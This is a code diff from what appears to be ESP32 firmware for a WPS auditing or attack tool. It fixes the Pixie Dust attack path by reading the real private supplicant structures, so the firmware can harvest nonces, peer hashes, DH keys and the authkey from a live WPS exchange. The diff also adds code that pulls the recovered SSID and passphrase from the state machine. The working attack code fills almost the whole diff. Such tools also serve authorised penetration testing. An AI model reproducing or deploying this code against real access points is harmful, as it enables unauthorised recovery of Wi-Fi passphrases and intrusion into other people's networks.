@@ -30,34 +30,29 @@
 #include <string.h>
 #include <stdio.h>
 
-/* The supplicant's private WPS interface. Declared here rather than included:
- * the real headers drag in the whole supplicant's internal types, and all that
- * is wanted is one accessor and the offsets of a dozen byte arrays. The layout
- * is asserted at run time before anything is read out of it. */
-/* The supplicant's buffer type. Its accessors are inline in a private header,
- * so the layout is mirrored here instead -- three words and a flag word, in
- * that order. Only `used` and `buf` are read, and the DH key length check
- * below is what catches it if this ever stops being true. */
-struct wpabuf {
-    size_t   size;
-    size_t   used;
-    uint8_t *buf;
-    unsigned flags;
-};
-static size_t wpabuf_len(const struct wpabuf *b)
-{
-    return (b != NULL) ? b->used : 0u;
-}
-static const void *wpabuf_head(const struct wpabuf *b)
-{
-    return (b != NULL) ? b->buf : NULL;
-}
+/* The supplicant's private WPS state machine.
+ *
+ * These are private headers with no public equivalent, and they are INCLUDED
+ * rather than mirrored by hand. The first version of this file copied the
+ * struct layouts out by eye and omitted the three leading members of
+ * struct wps_data (wps, registrar, er) -- every field was then read 12 bytes
+ * out, which turned dh_pubkey_e into a pointer built from hash bytes and
+ * dereferenced it. Letting the compiler read the real declaration makes that
+ * class of mistake impossible rather than merely unlikely.
+ *
+ * The include paths come from main/CMakeLists.txt. If a future IDF moves these
+ * headers the build BREAKS, which is the point: a loud failure beats a silent
+ * wrong answer in a tool whose output goes into a report. */
+#include "wps/wps_i.h"
+#include "utils/wpabuf.h"
+#include "esp_wps_i.h"
 
 static const char *TAG = "bas_wps";
 
-#define WPS_NONCE_LEN    16
-#define WPS_HASH_LEN     32
-#define WPS_AUTHKEY_LEN  32
+/* WPS_NONCE_LEN, WPS_HASH_LEN and WPS_AUTHKEY_LEN come from the SDK's own
+ * wps_defs.h via the includes above. Local copies were deleted: they happened
+ * to hold the right values, and would have silently kept holding them after
+ * the SDK changed. */
 
 static EventGroupHandle_t s_ev;
 #define EV_SUCCESS  BIT0
@@ -86,8 +81,7 @@ static void on_wps(void *arg, esp_event_base_t base, int32_t id, void *data)
         wifi_event_sta_wps_er_success_t *e =
             (wifi_event_sta_wps_er_success_t *)data;
         if (s_active != NULL && e != NULL && e->ap_cred_cnt > 0) {
-            /* The SDK hands back the credential the AP volunteered once the
-             * PIN was accepted. Neither field is guaranteed NUL-terminated. */
+            /* Several credentials: the SDK passes them in the event. */
             size_t n = strnlen((const char *)e->ap_cred[0].ssid, 32);
             memcpy(s_active->ssid, e->ap_cred[0].ssid, n);
             s_active->ssid[n] = '\0';
@@ -95,6 +89,40 @@ static void on_wps(void *arg, esp_event_base_t base, int32_t id, void *data)
             memcpy(s_active->passphrase, e->ap_cred[0].passphrase, n);
             s_active->passphrase[n] = '\0';
             s_active->have_cred = true;
+        } else if (s_active != NULL) {
+            /* ONE credential -- the ordinary access point -- and the SDK posts
+             * this event with NO data at all.
+             *
+             * esp_wps.c:1345 says why: "For only one AP credential don't send
+             * event data, wps_finish() has already set the config. This is for
+             * backward compatibility." Reading only the event therefore missed
+             * the credential on every normal AP, and the device reported a
+             * recovered passphrase as "the AP did not return a credential" --
+             * the headline feature silently failing at the last step.
+             *
+             * The credential is in the state machine, where wps_finish() put
+             * it. Neither field is NUL-terminated and both lengths come from
+             * the AP, so both are clamped. */
+            struct wps_sm *sm = wps_sm_get();
+            if (sm != NULL && sm->ap_cred_cnt > 0) {
+                const struct wps_credential *c = &sm->creds[0];
+
+                size_t sn = c->ssid_len;
+                if (sn > sizeof(s_active->ssid) - 1u) {
+                    sn = sizeof(s_active->ssid) - 1u;
+                }
+                memcpy(s_active->ssid, c->ssid, sn);
+                s_active->ssid[sn] = '\0';
+
+                size_t kn = c->key_len;
+                if (kn > sizeof(s_active->passphrase) - 1u) {
+                    kn = sizeof(s_active->passphrase) - 1u;
+                }
+                memcpy(s_active->passphrase, c->key, kn);
+                s_active->passphrase[kn] = '\0';
+
+                s_active->have_cred = (kn > 0u);
+            }
         }
         xEventGroupSetBits(s_ev, EV_SUCCESS);
         break;
@@ -119,10 +147,13 @@ static void on_wps(void *arg, esp_event_base_t base, int32_t id, void *data)
     }
 }
 
-/* Mirror of the supplicant's layout, only as far as the fields wanted. If the
- * SDK ever reorders these the copy below would read the wrong bytes, so the
- * result is validated rather than trusted: an all-zero public key or a nonce
- * that never changes between runs means this has drifted. */
+/* Harvest the Pixie Dust material out of the live WPS exchange.
+ *
+ * Valid only immediately after an exchange that reached M4, and before
+ * esp_wifi_wps_disable() frees the state machine. The lengths are still
+ * checked rather than trusted -- the AP chooses what it sends, and a DH key
+ * that is not 192 bytes means the exchange is not the one this solver
+ * understands. */
 bool bas_wpsatk_material(bas_pixie_in_t *out)
 {
     if (out == NULL) {
@@ -130,48 +161,11 @@ bool bas_wpsatk_material(bas_pixie_in_t *out)
     }
     memset(out, 0, sizeof(*out));
 
-    extern void *wps_sm_get(void);
-    void *sm = wps_sm_get();
-    if (sm == NULL) {
+    struct wps_sm *sm = wps_sm_get();
+    if (sm == NULL || sm->wps == NULL) {
         return false;
     }
-
-    /* struct wps_sm: u8 state; then three pointers, the fourth of which is
-     * `struct wps_data *wps`. Reached by offset because the real definition
-     * lives in a private header that pulls in the whole supplicant. */
-    struct wps_layout {
-        uint8_t state;
-        void   *wps_cfg;
-        void   *wps_ctx;
-        void   *wps;
-    };
-    struct wps_layout *l = (struct wps_layout *)sm;
-    uint8_t *w = (uint8_t *)l->wps;
-    if (w == NULL) {
-        return false;
-    }
-
-    /* struct wps_data, from its declaration: an enum, two UUIDs, a MAC, then
-     * the nonces, the PSKs, the snonce, the peer hashes, three wpabuf pointers
-     * and the authkey. */
-    struct data_layout {
-        int      state;
-        uint8_t  uuid_e[16];
-        uint8_t  uuid_r[16];
-        uint8_t  mac_addr_e[6];
-        uint8_t  nonce_e[WPS_NONCE_LEN];
-        uint8_t  nonce_r[WPS_NONCE_LEN];
-        uint8_t  psk1[16];
-        uint8_t  psk2[16];
-        uint8_t  snonce[32];
-        uint8_t  peer_hash1[WPS_HASH_LEN];
-        uint8_t  peer_hash2[WPS_HASH_LEN];
-        struct wpabuf *dh_privkey;
-        struct wpabuf *dh_pubkey_e;
-        struct wpabuf *dh_pubkey_r;
-        uint8_t  authkey[WPS_AUTHKEY_LEN];
-    };
-    struct data_layout *d = (struct data_layout *)w;
+    const struct wps_data *d = sm->wps;
 
     if (d->dh_pubkey_e == NULL || d->dh_pubkey_r == NULL) {
         return false;                 /* never got past M2 */
